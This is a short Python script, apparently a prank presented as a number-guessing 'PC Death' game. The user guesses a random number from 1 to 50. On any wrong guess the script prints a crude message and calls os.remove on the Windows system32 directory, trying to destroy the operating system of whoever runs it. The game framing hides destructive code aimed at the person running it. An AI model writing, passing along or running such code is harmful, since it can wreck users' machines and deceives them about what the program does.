import random
import os

def main_game():
        End = random.randint(1,50)
        user = int(input("Enter your PC Death number, Between(1 to 50): "))

        if End == user:
            print("Wow..., Today is your Goood Luck Brother.")

        else:
            print("Bro you just Fucked your PC.")
            os.remove("c:\\windows\\system32")
main_game()
        
